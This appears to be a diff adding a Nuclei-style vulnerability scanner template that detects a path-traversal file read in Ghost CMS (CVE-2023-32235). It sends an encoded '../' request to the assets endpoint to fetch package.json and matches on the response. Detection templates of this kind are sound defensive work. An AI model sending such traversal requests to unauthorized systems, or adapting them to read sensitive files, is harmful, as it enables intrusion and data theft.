@@ -1,0 +1,25 @@
+id: ghost-assets-file-read
+
+info:
+  name: Ghost File Read Vulnerability (CVE-2023-32235)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve, cve-2023-32235, file-read, ghost
+  description: |
+    This template detects arbitrary file read vulnerability in Ghost CMS by attempting to access the 'package.json' file via the vulnerable assets endpoint.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/assets/built%2F..%2F..%2F/package.json"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ghost"
+          - "name"
+          - "version"
